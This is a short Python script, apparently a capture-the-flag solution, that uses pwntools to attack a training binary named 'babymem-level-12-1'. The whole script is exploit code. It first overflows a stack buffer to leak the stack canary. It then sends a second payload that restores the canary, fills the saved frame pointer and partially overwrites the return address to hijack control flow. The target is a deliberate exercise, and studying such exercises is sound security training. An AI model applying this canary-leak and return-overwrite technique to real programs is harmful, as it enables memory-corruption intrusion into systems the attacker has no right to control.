from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/babymem-level-12-1')


buff_len = 0x90
ret_distance = buff_len + 8
canary_distance = ret_distance - 16
io = elf.process()
#gdb.attach(io)
io.sendline(b"512")

PAYLOAD = b"REPEAT" + b'A'*(canary_distance - 6) + b"Y"
io.send(PAYLOAD)
io.recvuntil(b"You said: ")
io.recvuntil("Y")
msg = io.recvuntil("\n")[:-1]
msg = msg[:7].rjust(8, b"\x00")
msg = u64(msg)
print(b"Read", hex(msg))
canary = p64(msg)
#print(b"Canary: ", canary)
PAYLOAD = b"A"*(canary_distance) + canary + p64(0xFFFFFFFFFFFFFFFF) + p16(0x21b0)
io.sendline(b"512")
io.send(PAYLOAD)
print(str(io.recvall()))